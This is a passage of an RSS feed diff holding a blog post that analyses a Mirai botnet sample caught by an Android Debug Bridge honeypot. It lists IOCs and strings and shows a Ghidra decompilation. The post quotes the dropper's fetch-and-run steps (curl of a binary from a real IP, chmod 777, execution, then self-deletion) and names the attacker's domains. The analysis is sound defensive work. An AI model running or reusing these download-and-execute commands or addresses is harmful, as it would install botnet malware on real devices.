+&lt;li>&lt;a class="link" href="https://www.microsoft.com/security/blog/2022/01/15/destructive-malware-targeting-ukrainian-organizations/" target="_blank" rel="noopener"
+>https://www.microsoft.com/security/blog/2022/01/15/destructive-malware-targeting-ukrainian-organizations/&lt;/a> Original Microsoft blog on WhisperGate.&lt;/li>
+&lt;/ul></description></item><item><title>Analysis of Mirai Malware</title><link>https://demo.stack.jimmycai.com/p/mirai_botnet/</link><pubDate>Tue, 04 Jan 2022 00:00:00 +0000</pubDate><guid>https://demo.stack.jimmycai.com/p/mirai_botnet/</guid><description>&lt;img src="https://m.media-amazon.com/images/I/41ZJaKEDzNL._AC_SX355_.jpg" alt="Featured image of post Analysis of Mirai Malware" />&lt;h2 id="intro">Intro&lt;/h2>
+&lt;p>I recently found out Google Cloud offers $300 for first time users, so I figured what better way to spend that than deploying a honeypot? While this blog post won&amp;rsquo;t go into detail on deploying one yourself (keep at eye on my &lt;a class="link" href="https://demo.stack.jimmycai.com/docs/welcome" >docs&lt;/a> for a that) it will go into detail analyzing a malware sample that I discovered being deployed against it.&lt;/p>
+&lt;!-- raw HTML omitted -->
+&lt;h2 id="timeline-and-recon">Timeline and Recon&lt;/h2>
+&lt;p>On January 4th 2022 at ~20:30 UTC my honeypot deployed in Oregon was attacked by 205.185.123.62 hosted in &lt;a class="link" href="https://www.iplocationtools.com/205.185.123.62" target="_blank" rel="noopener"
+>Las Vegas, Nevada.&lt;/a> It&amp;rsquo;s hosted by &amp;ldquo;Frantech Solutions&amp;rdquo; which a cursoury google search gives results such as &amp;ldquo;FranTech Solutions is &lt;strong>a high fraud risk ISP&lt;/strong>..&amp;rdquo; and &lt;a class="link" href="https://scamalytics.com/ip/isp/frantech-solutions" target="_blank" rel="noopener"
+>scamalytics&lt;/a> gives it a score of 64.&lt;/p>
+&lt;p>My honeypot was attacked a total of 24 times from this IP address. Starting at 20:30 UTC and ending at 11:00 UTC.&lt;/p>
+&lt;h2 id="attack-vector">Attack Vector&lt;/h2>
+&lt;p>This attack was caught by the &lt;a class="link" href="https://github.com/huuck/ADBHoney" target="_blank" rel="noopener"
+>ADBHoney&lt;/a> service running on my honeypot. ADBHoney describes itself as a &amp;ldquo;Low interaction honeypot designed for Android Debug Bridge over TCP/IP.&amp;rdquo; Now I have some experience with ADB in a prior CTF so I understood a small bit of what this honeypot does. ADB is the Andriod Debug Bridge. It&amp;rsquo;s essentially a protocol/tool that allows developers to communicate with andriod devices. It&amp;rsquo;s used prominately in the emulation part of Andriod Studio. Unfortunately for us, the TCP section of the ADB protocol &lt;strong>does not&lt;/strong> have any kind of authentication, leaving it open to attacks. This is what the honeypot sets up to gather samples.&lt;/p>
+&lt;h2 id="payload">Payload&lt;/h2>
+&lt;p>&lt;img src="https://demo.stack.jimmycai.com/p/mirai_botnet/initial_payload.png"
+width="750"
+height="334"
+srcset="https://demo.stack.jimmycai.com/p/mirai_botnet/initial_payload_hub1cf876330e3c7cd13194185af9490a0_34917_480x0_resize_box_3.png 480w, https://demo.stack.jimmycai.com/p/mirai_botnet/initial_payload_hub1cf876330e3c7cd13194185af9490a0_34917_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image"
+class="gallery-image"
+data-flex-grow="224"
+data-flex-basis="538px"
+>
+&lt;em>Figure 1: Inital Attack&lt;/em>&lt;/p>
+&lt;p>As we can see in Figure 1, the inital attack involves moving into the tmp directory, using &lt;a class="link" href="https://busybox.net/" target="_blank" rel="noopener"
+>busybox&lt;/a> to execute wget to get another sample and executes it. It repeats this twice, opting for curl for the second sample. Switching tools like that is common in malware droppers, allowing it to be ran on more hosts. A potential target could be missing either curl or wget, but missing both would be unlikely. Both &lt;strong>w.sh&lt;/strong> and &lt;strong>c.sh&lt;/strong> are essentially the same file as seen below. The only difference being what tool is used to download the next stage.&lt;/p>
+&lt;p>&lt;img src="https://demo.stack.jimmycai.com/p/mirai_botnet/wget.png"
+width="1374"
+height="670"
+srcset="https://demo.stack.jimmycai.com/p/mirai_botnet/wget_hu1a0e59869f2af55593fcce1618cc8e7e_207739_480x0_resize_box_3.png 480w, https://demo.stack.jimmycai.com/p/mirai_botnet/wget_hu1a0e59869f2af55593fcce1618cc8e7e_207739_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image"
+class="gallery-image"
+data-flex-grow="205"
+data-flex-basis="492px"
+>
+&lt;em>Figure 2: wget method&lt;/em>&lt;/p>
+&lt;p>&lt;img src="https://demo.stack.jimmycai.com/p/mirai_botnet/curl.png"
+width="1240"
+height="670"
+srcset="https://demo.stack.jimmycai.com/p/mirai_botnet/curl_hu447d906b6b66dd259da1a0824cc9f81b_167365_480x0_resize_box_3.png 480w, https://demo.stack.jimmycai.com/p/mirai_botnet/curl_hu447d906b6b66dd259da1a0824cc9f81b_167365_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image"
+class="gallery-image"
+data-flex-grow="185"
+data-flex-basis="444px"
+>
+&lt;em>Figure 3: curl method&lt;/em>&lt;/p>
+&lt;p>Here we can see how the actual malware sample is being downloaded. What makes this particular malware sample interesting is how it has different exectuables for a large set of instruction sets, ranging from ARM to SH4 to MIPS and even sparc. The first part of each line is downloading the malware &lt;code>curl htt[p]s://209.141.33.122/arm&lt;/code>, then setting it as executable &lt;code>chmod 777 arm&lt;/code>, then executing it with the argument of &amp;ldquo;android&amp;rdquo; &lt;code>./arm android&lt;/code>. The final part of the script &lt;code>rm $0&lt;/code> is deleting the script that was just ran in an effort to evade analysis.&lt;/p>
+&lt;h2 id="detection-rate-and-virustotal">Detection Rate and VirusTotal&lt;/h2>
+&lt;p>Uploading the MIPS sample to &lt;a class="link" href="https://www.virustotal.com/gui/file/10a5fabf1847feb44437827b040f707b432b3cc93167720fe9879ca33477d5c1/detection" target="_blank" rel="noopener"
+>VirusTotal&lt;/a> gives it a detection ratio of 36/56 and most AV vendors classify this sample as belonging to the &lt;a class="link" href="https://en.wikipedia.org/wiki/Mirai_%28malware%29" target="_blank" rel="noopener"
+>Mirai&lt;/a> botnet. It was first seen on December 29th, 2021.&lt;/p>
+&lt;p>VirusTotal Link: &lt;a class="link" href="https://www.virustotal.com/gui/file/10a5fabf1847feb44437827b040f707b432b3cc93167720fe9879ca33477d5c1/detection" target="_blank" rel="noopener"
+>https://www.virustotal.com/gui/file/10a5fabf1847feb44437827b040f707b432b3cc93167720fe9879ca33477d5c1/detection&lt;/a>&lt;/p>
+&lt;h2 id="iocs">IOCs&lt;/h2>
+&lt;p>If you see network activity to these IPs/Domains or system activity relating to them, you might be infected.&lt;br>
+IPs: 209.141.33.122&lt;br>
+Domains: bots1.firewalla1337.cc, scan1.firewalla1337.cc&lt;br>
+System Activity: Creation of binaries in &lt;code>/data/local/tmp&lt;/code> with the names of common instruction sets. Execution of binaries with the argument of &lt;code>android&lt;/code>.&lt;/p>
+&lt;h2 id="analysis">Analysis&lt;/h2>
+&lt;p>Note: My reversing skills are still in its infancy, so please bear with me.&lt;/p>
+&lt;p>The first thing I did to this binary was run strings against it. This gave me some interesting findings seen below:&lt;/p>
+&lt;h3 id="strings">Strings&lt;/h3>
+&lt;p>&lt;code>/dev/null&lt;/code>&lt;br>
+&lt;code>POST /cdn-cgi/&lt;/code>&lt;br>
+&lt;code>HTTP/1.1\r\nUser-Agent:&lt;/code>&lt;br>
+&lt;code>\r\nHost:&lt;/code>&lt;br>
+&lt;code>Cookie: &lt;/code> &lt;br>
+&lt;code>bots1.firewalla1337.cc&lt;/code>&lt;br>
+&lt;code>209.141.33.122&lt;/code>&lt;br>
+&lt;code>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345678&lt;/code>&lt;br>
+&lt;code>dadlcldadg&lt;/code> &lt;br>
+&lt;code>scan1.firewalla1337.cc&lt;/code>&lt;/p>
+&lt;p>Lets open this sample in ghidra and look into it a bit further.&lt;/p>
+&lt;p>The only function I could make sense of was what to me looks like a domain resolution function here:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">FUN_00410544&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">byte&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">pbVar1&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">uint&lt;/span> &lt;span class="n">uVar2&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">undefined2&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">puVar3&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">iVar4&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pbVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">byte&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nf">FUN_00411908&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;bot[s]1.firewalla1337.cc&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">pbVar1&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">byte&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="mh">0x0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iVar4&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">pbVar1&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">uVar2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">FUN_00411518&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">pbVar1&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">trap&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x1c00&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">DAT_0045d784&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">undefined4&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)((&lt;/span>&lt;span class="n">uVar2&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">uint&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">pbVar1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">iVar4&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">FUN_0041189c&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pbVar1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">FUN_00414e24&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">puVar3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">undefined2&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nf">FUN_00414d0c&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">DAT_0045d782&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">puVar3&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="cm">/* WARNING: Could not recover jumptable at 0x00410634. Too many branches */&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="cm">/* WARNING: Treating indirect jump as call */&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">FUN_00414d40&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">DAT_0045d784&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">FUN_00417c20&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;209.1[4]1.33.122&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;em>Brackets in IP address and Domain added by myself&lt;/em>&lt;/p>
+&lt;p>Both the domain name and IP address are hardcoded, but these are both the same address of the machine where the attack originated from meaning we dont have the C2&amp;rsquo;s address.&lt;/p>
+&lt;p>There are references to POSTs and setting URL variables in the malware which tells me that&amp;rsquo;s most likely the way communication is handled between the C2 and the bots.&lt;/p>
+&lt;h2 id="closing-thoughts">Closing Thoughts&lt;/h2>
+&lt;p>Unfortunately this is the extent of my analysis of this sample. My reversing skills arent where they should be in order to properly reverse this sample. I would try dynamic analysis and see what domains/IPs this sample tries to contact, but the x86 version was not available and I do not have any spare system capable of executing the other instruction sets besides my Raspberry Pi4s, so lookout for a potential part 2 of this post where I execute the malware in a lab environment.&lt;/p>
+&lt;p>Thank you so much for reading this post. I learned a lot while investigating this sample and hopefully you learned something new reading this blog post. I hope to post more about my activities with my honeypot so keep an eye out for those posts when they drop.&lt;/p>
+&lt;p>As always, if you have any feedback please don&amp;rsquo;t hesitate to contact me at &lt;a class="link" href="mailto:nathan@nburns.tech?Subject=Reverse_Blogpost" >my email.&lt;/a>&lt;/p>
+&lt;p>Nathan Burns&lt;/p></description></item></channel></rss>
